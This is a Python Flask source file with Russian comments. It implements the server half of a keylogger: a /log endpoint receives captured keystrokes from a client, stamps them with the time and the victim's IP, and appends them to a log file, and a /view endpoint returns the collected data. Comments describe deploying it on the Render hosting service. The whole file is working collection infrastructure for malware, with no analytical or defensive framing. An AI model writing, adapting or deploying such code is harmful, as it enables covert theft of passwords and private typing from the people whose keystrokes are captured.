import os
import json
from flask import Flask, request, jsonify
from datetime import datetime

app = Flask(__name__)

# Секретный ключ берётся из переменной окружения, которую мы зададим в Render
VALID_KEY = os.environ.get('API_KEY', 'default_key_change_me')

# Имя файла для хранения полученных данных
DATA_FILE = 'keystrokes.log'

@app.route('/log', methods=['POST'])
def log_keystrokes():
    """
    Эндпоинт для приёма данных от клиента-кейлоггера.
    Ожидает POST-запрос с JSON-телом, содержащим поле 'keys'.
    """
    # 1. Проверяем API-ключ (передаётся в заголовке X-API-Key)
    api_key = request.headers.get('X-API-Key')
    if api_key != VALID_KEY:
        return jsonify({'error': 'Unauthorized'}), 401

    # 2. Получаем данные из запроса
    data = request.get_json()
    if not data or 'keys' not in data:
        return jsonify({'error': 'Invalid data'}), 400

    # 3. Добавляем служебную информацию (время сервера, IP клиента)
    data['server_time'] = datetime.now().isoformat()
    data['client_ip'] = request.remote_addr

    # 4. Сохраняем данные в файл (каждая запись на новой строке)
    try:
        with open(DATA_FILE, 'a', encoding='utf-8') as f:
            f.write(json.dumps(data, ensure_ascii=False) + '\n')
    except Exception as e:
        return jsonify({'error': f'Failed to write data: {str(e)}'}), 500

    return jsonify({'status': 'ok'}), 200


@app.route('/view', methods=['GET'])
def view_logs():
    """
    (Опционально) Эндпоинт для просмотра собранных данных.
    Требует тот же API-ключ в заголовке X-API-Key.
    """
    api_key = request.headers.get('X-API-Key')
    if api_key != VALID_KEY:
        return 'Unauthorized', 401

    if not os.path.exists(DATA_FILE):
        return 'No data yet', 200

    with open(DATA_FILE, 'r', encoding='utf-8') as f:
        content = f.read()
    return content, 200, {'Content-Type': 'text/plain; charset=utf-8'}


@app.route('/health', methods=['GET'])
def health():
    """Простой эндпоинт для проверки, что сервер работает."""
    return 'OK', 200


# Для локального запуска (необязательно, но удобно для теста)
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))  # Render сам задаёт PORT
    app.run(host='0.0.0.0', port=port, debug=False)
